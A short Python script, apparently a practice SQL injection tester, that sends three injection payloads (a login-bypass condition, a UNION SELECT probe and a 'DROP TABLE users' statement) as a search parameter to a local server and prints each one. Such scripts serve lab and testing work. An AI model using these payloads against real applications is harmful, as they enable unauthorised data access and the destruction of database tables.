import requests

payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--"
]

for p in payloads:
    response = requests.get(
        "http://127.0.0.1:8080",
        params={"search": p}
    )
    print("Sent payload:", p)
